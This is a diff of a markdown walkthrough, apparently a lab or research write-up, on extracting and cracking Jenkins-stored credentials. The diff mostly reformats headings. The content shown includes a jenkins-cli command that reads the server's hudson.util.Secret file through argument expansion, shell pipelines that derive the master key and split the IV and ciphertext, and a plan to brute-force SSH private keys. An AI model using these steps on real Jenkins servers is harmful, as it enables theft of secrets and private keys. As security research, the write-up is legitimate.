@@ -186,18 +186,17 @@ The IV starts usually after the header from the `10th` byte.
 
 Now it is time to place all together and automate the steps to crack the encrypted credentials: 
 
-#### Getting the hudson file
-*Getting Hudson file* 
+**Getting Hudson file** 
 ```bash
-java -jar ~/Downloads/jenkins-cli.jar -s http://sherif.com:9091 who-am-i '@/var/jenkins_home/secrets/hudson.util.Secret' 2>&1  | tail -c +33 | head -c 192 | xxd | tee hudson.bin
+java -jar jenkins-cli.jar -s http://sherif.com:9091 who-am-i '@/var/jenkins_home/secrets/hudson.util.Secret' 2>&1  | tail -c +33 | head -c 192 | xxd | tee hudson.bin
 ```
-*sorting the master.key*
+**Sorting the master.key**
 
 The steps needed for master key is to hex it, and sha256 of first `16 bytes`
 ```bash
 cat masterkey.bin | xxd -p | tr -d '\n' | xxd -r -p | sha256sum | cut -c1-32 | sed 's/../0x&,/g'
 ```
-*Getting IV and cipher text* 
+**Getting IV and cipher text** 
 
 You can apply these lines to the cipher text
 ```bash
@@ -205,7 +204,7 @@ echo -n $1 | base64 -d | tail -c +10 | head -c +16 | xxd -p | sed 's/../0x&,/g'
 echo -n $1 | base64 -d | tail -c +26 | xxd -p | sed 's/../0x&,/g'
 ```
 The first output is for the IV, second for the ciphertext.
-*Start brute forcing* 
+**Start brute forcing** 
 
 I'll be using the same rust code that was developed by Guillaume with slight modification of checking only printable characters and also check if the first 5 bytes of decrypted text are `-----` which is the start of the private ssh key. 
 
